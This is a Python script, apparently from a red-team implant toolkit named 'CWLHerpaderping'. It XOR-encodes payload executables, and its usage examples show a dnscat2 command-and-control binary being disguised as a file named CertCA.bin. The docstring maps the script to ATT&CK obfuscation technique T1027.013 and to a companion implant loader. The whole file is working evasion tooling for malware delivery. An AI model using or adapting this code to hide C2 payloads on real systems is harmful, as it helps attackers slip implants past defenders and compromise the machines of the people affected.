#!/usr/bin/env python3
"""
encrypt_payload_xor.py — Position-dependent XOR encoder/decoder for CWLHerpaderping payloads

Formula: out[i] = in[i] ^ ((BASE + i * STEP) & 0xFF)
  BASE = 0xA3, STEP = 0x5B  (matches PAYLOAD_XOR_BASE/PAYLOAD_XOR_STEP in CWLImplant.cpp)

XOR is self-inverse: encoding and decoding use the same function.

ATT&CK: T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File

Usage:
  python encrypt_payload_xor.py <input> -o <output>

  Encode:   python encrypt_payload_xor.py dnscat2.exe      -o CertCA.bin
  Decode:   python encrypt_payload_xor.py CertCA.bin       -o dnscat2.dec
  Verify:   python -c "
              import hashlib
              a = hashlib.md5(open('dnscat2.exe','rb').read()).hexdigest()
              b = hashlib.md5(open('dnscat2.dec','rb').read()).hexdigest()
              print('MATCH' if a == b else 'MISMATCH', a, b)
            "

Test (first byte of MZ PE after encoding):
  python -c "d=open('CertCA.bin','rb').read(); print(hex(d[0]))"
  # Expected: 0xee  (0x4D ^ 0xA3 == 0xEE)
"""

import sys
import argparse

BASE: int = 0xA3
STEP: int = 0x5B


def xor_transform(data: bytes) -> bytes:
    return bytes(b ^ ((BASE + i * STEP) & 0xFF) for i, b in enumerate(data))


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Position-dependent XOR encode/decode (self-inverse, same function for both)"
    )
    parser.add_argument("input", help="Input file path")
    parser.add_argument("-o", "--output", required=True, help="Output file path")
    args = parser.parse_args()

    try:
        with open(args.input, "rb") as f:
            raw = f.read()
    except OSError as e:
        print(f"[-] Cannot read input file: {e}", file=sys.stderr)
        sys.exit(1)

    transformed = xor_transform(raw)

    try:
        with open(args.output, "wb") as f:
            f.write(transformed)
    except OSError as e:
        print(f"[-] Cannot write output file: {e}", file=sys.stderr)
        sys.exit(1)

    first_in  = hex(raw[0])         if raw         else "N/A"
    first_out = hex(transformed[0]) if transformed else "N/A"
    print(f"[+] {args.input} ({len(raw)} bytes) -> {args.output}")
    print(f"[*] First byte: {first_in} -> {first_out}  (MZ=0x4D encodes to 0xEE)")
    print(f"[*] Formula: out[i] = in[i] ^ ((0x{BASE:02X} + i * 0x{STEP:02X}) & 0xFF)")


if __name__ == "__main__":
    main()
